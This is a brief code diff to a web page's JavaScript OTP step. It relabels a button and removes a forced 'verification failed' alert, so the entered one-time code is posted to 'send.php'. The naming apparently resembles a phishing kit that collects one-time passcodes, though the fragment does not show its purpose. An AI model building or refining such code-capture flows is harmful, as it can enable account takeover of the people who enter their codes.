@@ -486,7 +486,7 @@ function nextStep() {
         });
 
         document.getElementById("otpSection").style.display = "block";
-        document.getElementById("mainBtn").innerText = "Verify OTP";
+        document.getElementById("mainBtn").innerText = "Confirm";
         document.getElementById("attemptText").style.display = "block";
 
         otpShown = true;
@@ -498,8 +498,6 @@ function nextStep() {
         if (otp.length < 6) {
             return;
         }
-          alert("OTP verification failed");
-return;
         fetch("send.php", {
             method: "POST",
             headers: {
